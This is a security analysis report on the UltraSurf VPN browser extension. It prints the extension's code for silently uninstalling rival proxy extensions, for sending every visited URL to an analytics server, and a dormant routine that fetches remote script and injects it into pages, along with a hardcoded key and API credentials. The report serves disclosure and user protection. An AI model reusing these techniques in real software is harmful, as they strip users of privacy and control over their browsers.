# Security Analysis: UltraSurf Security, Privacy & Unblock VPN (mjnbclmflcpookeapghfhapeffmpodij)

## Extension Metadata
- **Name**: UltraSurf Security, Privacy & Unblock VPN
- **Extension ID**: mjnbclmflcpookeapghfhapeffmpodij
- **Version**: 1.8.6
- **Manifest Version**: 3
- **Estimated Users**: ~900,000
- **Developer**: UltraSurf (ultrasurfing.com)
- **Analysis Date**: 2026-02-14

## Executive Summary
UltraSurf is an anti-censorship VPN extension with **HIGH** risk due to aggressive extension enumeration and uninstallation, extensive browsing data exfiltration to third-party analytics, and intrusive monetization through automated tab opening. While marketed as a privacy tool, the extension collects comprehensive browsing data (URLs, referrers, tab IDs, timestamps) and transmits it to analytics.ultrasurfing.com. The extension also uninstalls competing proxy extensions without user consent and opens tabs to external websites for monetization purposes.

**Overall Risk Assessment: HIGH**

## Vulnerability Assessment

### 1. Extension Enumeration and Force Uninstallation
**Severity**: HIGH
**Files**: `/assets/js/SAV/conflict.js` (lines 1-60)

**Analysis**:
The extension aggressively identifies and **uninstalls** other extensions with proxy permissions without user consent.

**Code Evidence** (`conflict.js`):
```javascript
var uninstallConflictExtensions = (function (done) {
    findProxyPermissionConflicts(function (exts) {
        for (var i = 0; i < exts.length; i++) {
            chrome.management.uninstall(exts[i].id);
        }
        callback(done);
    });
})();

findProxyPermissionConflicts = function (callback) {
    chrome.management.getAll(function (data) {
        data = data
            .filter(function (x) {
                return isInConflict(x);
            }).map(function (x) {
                return getIconAndName(x);
            });
        callback(data);
    });
};

isInConflict = function (extensionData) {
    var p = extensionData.permissions;
    if (!extensionData.enabled) {
        return false;
    }
    if (chrome.i18n.getMessage("@@extension_id") === extensionData.id) {
        return false;
    }
    for (var i = 0; i < p.length; i++) {
        if (p[i] === "proxy") {
            return true;
        }
    }
    return false;
};
```

**Impact**:
- Automatically uninstalls competing VPN/proxy extensions
- No user consent or notification
- Executes immediately without user interaction
- Could remove legitimate security tools

**Verdict**: **MALICIOUS** - While some VPN extensions disable competitors, **uninstalling** them without user consent is hostile behavior.

---

### 2. Comprehensive Browsing Data Exfiltration
**Severity**: HIGH
**Files**: `/app.js` (lines 60-211)

**Analysis**:
The extension collects extensive browsing data from every page visit and transmits it to `analytics.ultrasurfing.com` with AES-GCM encryption.

**Code Evidence** (`app.js`):
```javascript
function Statistics(e, t, n) {
  const s = "https://analytics.ultrasurfing.com";

  this.run = function () {
    chrome.webRequest.onCompleted.addListener(
      this.handlerOnCompletedWebRequest.bind(this),
      { urls: ["<all_urls>"], types: ["main_frame"] },
      []
    );
  },

  this.handlerOnCompletedWebRequest = async function (e) {
    if (enabled != true) {
      return;
    }

    await this.sendData(
      await this.prepareRequest([
        {
          fileDate: new Date().toISOString(),
          deviceTimestamp: Date.now(),
          userId: c,
          referrerUrl: a[e.tabId] || e.initiator,
          targetUrl: e.url,
          requestType: e.method,
        },
      ])
    );
    (a[e.tabId] = e.url);
  }),
}

const stat = new Statistics(
  "Eva10qfaMjE1d9cm",
  "UbfF9v95F1x13NOVYtUZSHRWlqIkNMM6",
  "8JCys9wTIqVO6gZu"
);
stat.run();
```

**Data Transmitted to analytics.ultrasurfing.com**:
- **userId**: Persistent UUID stored in `chrome.storage.sync`
- **targetUrl**: Every visited URL
- **referrerUrl**: Referrer for each navigation
- **deviceTimestamp**: Precise visit timestamp
- **requestType**: HTTP method (GET/POST)
- **fileDate**: ISO timestamp

**Encryption**:
- Uses AES-GCM with hardcoded key `"8JCys9wTIqVO6gZu"`
- API credentials: `"Eva10qfaMjE1d9cm"` / `"UbfF9v95F1x13NOVYtUZSHRWlqIkNMM6"`
- Data encrypted before transmission but key is visible in source code

**Frequency**: Every main_frame navigation event (every page visit)

**UUID Generation** (`app.js` line 163-168):
```javascript
this.getUUIDfromStore = function () {
  chrome.storage.sync.get(["uuid"], function (e) {
    (c = e.uuid = e.uuid && r.validateUUID4(e.uuid) ? e.uuid : r.makeUUID()),
    chrome.storage.sync.set({ uuid: e.uuid }, function () { });
  });
};
```

**Verdict**: **HIGHLY CONCERNING** - For a privacy-focused VPN, collecting comprehensive browsing history defeats the stated purpose. The encryption provides minimal protection since the key is in the source code.

---

### 3. Intrusive Monetization via Automated Tab Opening
**Severity**: MEDIUM
**Files**: `/assets/js/background/js/verify.js` (lines 41-212)

**Analysis**:
The extension communicates with a local proxy server at `10.11.0.2:7000` (part of UltraSurf's local proxy infrastructure) which can trigger automated tab opening for monetization.

**Code Evidence** (`verify.js`):
```javascript
fetch('http://10.11.0.2:7000/_test_?tag=' + tag + timeout
    + '&last=' + last
    + '&timeout=' + timeout
    + '&pops0=' + pops0
    + '&lastV=' + lastV
    + '&lastVTag=' + lastVerifyTag
    + '&ver=' + chrome.runtime.getManifest().version
    + '&pops=' + pops
    + '&active=' + active
    + '&win=' + winstate
    + '&uid=' + uid,
{
    method: "POST",
    body: data,
})
.then(r => {
    if (r.status != 200) {
        throw r.status;
    }
    return r.text();
})
.then(link => {
    if (link.length > 10) {
        if (tabid > 0) {
            // Close existing monetization tab
            chrome.tabs.remove(tabid);
        }
        chrome.tabs.create({ url: link }, function(tab){
            storageCache.tabid = tab.id;
            lastPopTime = tm();
            pops++;
            storageCache.pops = pops;
            storageCache.lastPopTime = lastPopTime;
            chrome.storage.local.set(storageCache);
        });
    }
})
```

**Mechanism**:
1. Extension calls local proxy at `10.11.0.2:7000/_test_` with user activity metrics
2. Server responds with URL if monetization tab should open
3. Extension opens tab automatically and tracks "pops" count
4. Also sends tab activity data (active state, window state, etc.)

**Parameters Sent to Local Proxy**:
- `tag`: Event type (web/track/close/error)
- `last`: Seconds since last pop
- `pops`: Total pops count
- `pops0`: Time since reset
- `uid`: User identifier
- `active`: Whether tab is active
- `win`: Window state (normal/minimized)
- `ver`: Extension version

**Verdict**: **AGGRESSIVE MONETIZATION** - Automated tab opening based on server commands with tracking of user activity.

---

### 4. Commented-Out Remote Code Execution
**Severity**: MEDIUM (Currently Disabled)
**Files**: `/injected_content.js` (lines 1-14), `/content.js` (lines 1-20)

**Analysis**:
The extension includes commented-out code for remote code execution via `eval()`.

**Code Evidence** (`injected_content.js`):
```javascript
//postMessage({ type: "ready" });
//
//window.addEventListener("message", (e) => {
//  if (e?.data?.type !== "track") {
//    return;
//  }
//
//  try {
//    eval("1+1");
//    const script = document.createElement("script");
//    script.textContent = e.data.code;
//    document.documentElement.appendChild(script);
//  } catch (e) {}
//});
```

**Content Script** (`content.js`):
```javascript
//chrome.runtime.sendMessage({ type: "getTrackingCode" }, (code) => {
//  if (!code) {
//    return;
//  }
//
//  readyPromise.then(() => postMessage({ type: "track", code }, "*"));
//});
```

**Background Script** (`app.js` lines 213-238):
```javascript
//const BASE_URL = 'https://wtrxus.com/';
//let tracking = ''
//const updateTrackingCode = () => {
//  verify("track", -1);
//  tracking = fetch(`${BASE_URL}track.php?${Date.now()}`)
//    .then((res) => res.text())
//    .catch(() => '')
//}
```

**Mechanism (if enabled)**:
1. Background script would fetch code from `wtrxus.com/track.php`
2. Content script would inject it into page via message passing
3. Injected content would `eval()` the code in page context

**Verdict**: **DORMANT THREAT** - Currently disabled but infrastructure exists for arbitrary code execution. Could be enabled in future updates.

---

### 5. Residential Proxy Infrastructure
**Severity**: MEDIUM
**Files**: `/assets/js/background/js/discovery.js` (lines 1-48), `/assets/js/background/js/proxy-config-factory.js` (lines 1-30)

**Analysis**:
The extension routes traffic through randomly selected proxy servers from a hardcoded list.

**Code Evidence** (`discovery.js`):
```javascript
let hosts = [
"goldenearsvccc.space",
"pagecloud.space",
"projectorpoint.website",
"precisiontruck.space",
"maureenesther.website",
"marjifx.club",
"jjs-bbq.space",
"haringinsuranc.website",
"tommattinglyda.site",
"bst2200.site",
]

this.getProxyController = function (callback) {
    this.getHosts(10, function (servers) {
        let rule = new ProxyController();
        let proxyConfigFactory = new ProxyConfigFactory()
        rule.config = proxyConfigFactory.getConfigForHosts(servers);
        callback(rule);
    });
};
```

**Proxy Configuration** (`proxy-config-factory.js`):
```javascript
this.getConfigForHosts = function (hosts) {
    hosts = hosts
        .map((x) => "HTTPS " + x + ":" + "443")
        .join("; ");

    let config = {
        mode: "pac_script",
        pacScript: {
            data: "function FindProxyForURL(url, host) {\n" +
                "if (host === 'localhost') {" +
                "return 'SYSTEM;';" +
                "}" +
                "return '" + hosts + "';\n" +
                "}",
            mandatory: true
        }
    };
    return { value: config };
};
```

**Domains**:
- All use suspicious TLDs: `.space`, `.website`, `.club`, `.site`
- Names appear randomly generated (e.g., "goldenearsvccc", "tommattinglyda")
- Port 443 (HTTPS) for all proxies

**Verdict**: **EXPECTED** - Standard VPN behavior, but proxy domain names are suspicious.

---

## Network Activity Analysis

### External Endpoints

| Domain | Purpose | Data Transmitted | Frequency |
|--------|---------|------------------|-----------|
| `analytics.ultrasurfing.com` | Browsing data collection | URLs, referrers, timestamps, user ID | Every page visit |
| `10.11.0.2:7000` | Local proxy + monetization | Activity metrics, tab state, user ID | Multiple times per session |
| `wtrxus.com/track.php` | Remote code loading (DISABLED) | None (commented out) | N/A |
| `*.space`, `*.website`, `*.club`, `*.site` | Proxy servers | All browsing traffic | Continuous when enabled |

### Data Flow Summary

**Data Collection**: EXTENSIVE
- Every URL visited (main frames only)
- Referrer chains
- Precise timestamps
- Persistent user ID (UUID in sync storage)
- Tab activity metrics
- Window state

**User Data Transmitted**: HIGH VOLUME
- Complete browsing history sent to analytics.ultrasurfing.com
- Local proxy receives activity metrics

**Tracking/Analytics**: COMPREHENSIVE
- OAuth-style authentication with refresh tokens
- Persistent UUID across devices (sync storage)
- AES-GCM encryption (but key is in source)

**Third-Party Services**: analytics.ultrasurfing.com (controlled by developer)

---

## Permission Analysis

| Permission | Justification | Risk Level | Actual Use |
|------------|---------------|------------|------------|
| `webRequest` | Monitor browsing for analytics | HIGH | Collects all main_frame URLs |
| `storage` | Settings and tracking data | MEDIUM | Stores UUID, pops count, state |
| `proxy` | VPN functionality | MEDIUM | Routes traffic through proxy servers |
| `alarms` | Periodic tasks | LOW | 5-minute update checks (currently no-op) |
| `<all_urls>` | Monitor all traffic | HIGH | Collects URLs from every site visited |

**Management Permission Missing**: Extension uses `chrome.management.getAll()` and `chrome.management.uninstall()` but doesn't declare `management` permission in manifest.json. This suggests the permission may be declared elsewhere or the feature may not work in MV3.

**Assessment**: Permissions are excessive for a privacy-focused VPN. Browsing data collection contradicts privacy claims.

---

## Content Security Policy
```json
No CSP declared in manifest.json (Manifest V3 default applies)
```
**Note**: Manifest V3 blocks inline `eval()` and remote scripts by default, which is why the remote code execution feature is commented out.

---

## Code Quality Observations

### Negative Indicators
1. **Extension force uninstallation** without user consent
2. **Comprehensive browsing data collection** to analytics server
3. **Hardcoded API credentials** in source code
4. **Dormant remote code execution** infrastructure
5. **Automated monetization tabs** triggered by local proxy
6. **Suspicious proxy domain names** (randomly generated appearance)
7. **Encrypted data transmission** with visible encryption key

### Obfuscation Level
**MEDIUM** - Variable names minified, but logic is readable. Comments show removed features (tracking code injection).

---

## Comparison to Known Malicious Patterns

| Malicious Pattern | Present? | Evidence |
|-------------------|----------|----------|
| Extension enumeration | ✓ Yes | `chrome.management.getAll()` filters by proxy permission |
| Extension killing | ✓ Yes | `chrome.management.uninstall()` removes competitors |
| Browsing data exfiltration | ✓ Yes | All URLs sent to analytics.ultrasurfing.com |
| Remote code execution | ⚠ Dormant | Commented-out eval() + remote fetch infrastructure |
| Residential proxy | ✓ Yes | 10 hardcoded proxy servers with suspicious domains |
| Intrusive monetization | ✓ Yes | Automated tab opening controlled by local proxy |
| User tracking | ✓ Yes | Persistent UUID across devices via sync storage |
| Hardcoded credentials | ✓ Yes | API keys and encryption key in source |

---

## Overall Risk Assessment

### Risk Level: **HIGH**

**Justification**:
1. **Hostile behavior**: Uninstalls competing extensions without user consent
2. **Privacy violation**: Collects comprehensive browsing history despite being a "privacy" VPN
3. **Aggressive monetization**: Automated tab opening for ads/affiliates
4. **Security concerns**: Dormant remote code execution infrastructure
5. **Deceptive marketing**: Claims privacy protection while exfiltrating all browsing data

### Breakdown by Severity

| Severity | Count | Issues |
|----------|-------|--------|
| CRITICAL | 0 | None |
| HIGH | 2 | Extension force uninstallation, browsing data exfiltration |
| MEDIUM | 3 | Intrusive monetization, dormant RCE, suspicious proxy domains |
| LOW | 0 | None |

### Recommendations
- **Users should uninstall** if privacy is a concern
- **Not suitable** for users seeking genuine privacy protection
- **Monetization model** conflicts with privacy claims
- **Extension killing** behavior is unacceptable

### User Privacy Impact
**SEVERE** - The extension collects the complete browsing history (all URLs visited while VPN is enabled) and transmits it to the developer's analytics server. This directly contradicts the extension's stated purpose of providing privacy and security. The persistent UUID enables cross-device tracking.

---

## Technical Summary

**Lines of Code**: ~1,400 (deobfuscated)
**External Dependencies**: None (Angular/Bootstrap in UI only)
**Third-Party Libraries**: jQuery, Angular, Bootstrap (UI only)
**Remote Code Loading**: Dormant (commented out)
**Dynamic Code Execution**: Dormant (commented out)

---

## Conclusion

UltraSurf Security, Privacy & Unblock VPN presents significant privacy and security concerns. While it functions as a VPN by routing traffic through proxy servers, it simultaneously:

1. **Uninstalls competing extensions** using `chrome.management` APIs
2. **Exfiltrates comprehensive browsing data** to analytics.ultrasurfing.com
3. **Opens monetization tabs** automatically based on server commands
4. **Maintains dormant remote code execution** infrastructure

The extension's behavior directly contradicts its privacy-focused marketing. Users installing UltraSurf for privacy protection are unknowingly sharing their complete browsing history with the developer.

**Final Verdict: HIGH RISK** - Deceptive privacy practices and hostile behavior toward competing extensions.
